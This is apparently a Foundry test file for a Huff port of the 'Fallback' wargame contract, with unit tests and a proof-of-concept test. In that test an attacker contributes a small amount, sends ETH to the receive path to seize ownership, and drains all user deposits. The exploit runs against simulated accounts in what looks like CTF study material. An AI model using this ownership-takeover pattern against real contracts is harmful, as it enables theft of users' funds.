// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

import {Test} from "forge-std/Test.sol";

import {HuffDeployer} from "foundry-huff/HuffDeployer.sol";

import {IFallback} from "src/interfaces/IFallback.sol";

contract FallbackTest is Test {
    address OWNER = makeAddr("Owner");

    address ALICE = makeAddr("Alice");
    address BOB = makeAddr("Bob");
    address CAROL = makeAddr("Carol");
    address DAVE = makeAddr("Dave");
    address EVE = makeAddr("Eve");
    address FRED = makeAddr("Fred");
    address GARY = makeAddr("Gary");
    address HARRY = makeAddr("Harry");
    address IAN = makeAddr("Ian");
    address JANE = makeAddr("Jane");

    address ATTACKER = makeAddr("Attacker");

    IFallback fallbackInterface;

    error CallFailed();

    function setUp() public {
        vm.deal(ALICE, 10 ether);
        vm.deal(BOB, 10 ether);
        vm.deal(CAROL, 10 ether);
        vm.deal(DAVE, 10 ether);
        vm.deal(EVE, 10 ether);
        vm.deal(FRED, 10 ether);
        vm.deal(GARY, 10 ether);
        vm.deal(HARRY, 10 ether);
        vm.deal(IAN, 10 ether);
        vm.deal(JANE, 10 ether);

        vm.deal(ATTACKER, 0.003 ether);

        vm.prank(OWNER);
        address fallbackAddress = HuffDeployer
            .config()
            .with_args(abi.encode(OWNER))
            .deploy("Fallback");
        fallbackInterface = IFallback(fallbackAddress);
    }

    function test_contributions() public {
        assertEq(fallbackInterface.contributions(OWNER), 1000 ether);
    }

    function test_owner() public {
        assertEq(fallbackInterface.owner(), OWNER);
    }

    function test_contribute() public {
        vm.deal(ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);

        vm.expectRevert();
        fallbackInterface.contribute{value: 0.0001 ether}();

        fallbackInterface.contribute{value: 10000 ether}();

        vm.stopPrank();

        assertEq(fallbackInterface.contributions(ATTACKER), 10000 ether);
        assertEq(fallbackInterface.owner(), ATTACKER);
    }

    function test_getContributions() public {
        vm.prank(OWNER);
        assertEq(fallbackInterface.getContribution(), 1000 ether);
    }

    function test_withdraw() public {
        vm.deal(address(fallbackInterface), 10000 ether);

        vm.startPrank(ATTACKER);

        vm.expectRevert();
        fallbackInterface.withdraw();

        vm.stopPrank();

        vm.prank(OWNER);
        fallbackInterface.withdraw();

        assertEq(address(OWNER).balance, 10000 ether);
    }

    function test_receive() public {
        vm.startPrank(ATTACKER);

        vm.expectRevert();
        (bool successFirst, ) = address(fallbackInterface).call{
            value: 0.003 ether
        }("");
        if (!successFirst) revert CallFailed();

        fallbackInterface.contribute{value: 0.002 ether}();

        (bool successSecond, ) = address(fallbackInterface).call{
            value: 0.001 ether
        }("");
        if (!successSecond) revert CallFailed();

        assertEq(fallbackInterface.owner(), ATTACKER);
    }

    function test_PoC() public {
        console.log(
            "FALLBACK'S OWNER (BEFORE ATTACK): ",
            fallbackInterface.owner()
        );
        console.log(
            "FALLBACK'S BALANCE (BEFORE DEPOSITS): ",
            address(fallbackInterface).balance
        );

        vm.prank(ALICE);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + ALICE'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(BOB);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + BOB'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(CAROL);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + CAROL'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(DAVE);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + DAVE'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(EVE);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + EVE'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(FRED);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + FRED'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(GARY);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + GARY'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(HARRY);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + HARRY'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(IAN);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + IAN'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        vm.prank(JANE);
        fallbackInterface.contribute{value: 10 ether}();
        console.log(
            "FALLBACK'S BALANCE + JANE'S DEPOSIT: ",
            address(fallbackInterface).balance
        );

        console.log(
            "FALLBACK'S BALANCE (AFTER DEPOSITS): ",
            address(fallbackInterface).balance
        );

        vm.startPrank(ATTACKER);

        fallbackInterface.contribute{value: 0.002 ether}();
        (bool success, ) = address(fallbackInterface).call{value: 0.001 ether}(
            ""
        );
        if (!success) revert CallFailed();
        fallbackInterface.withdraw();

        vm.stopPrank();

        console.log(
            "FALLBACK'S OWNER (AFTER ATTACK): ",
            fallbackInterface.owner()
        );
        console.log(
            "FALLBACK'S BALANCE (AFTER ATTACK): ",
            address(fallbackInterface).balance
        );
        console.log("ATTACKER'S BALANCE (AFTER ATTACK): ", ATTACKER.balance);
    }
}
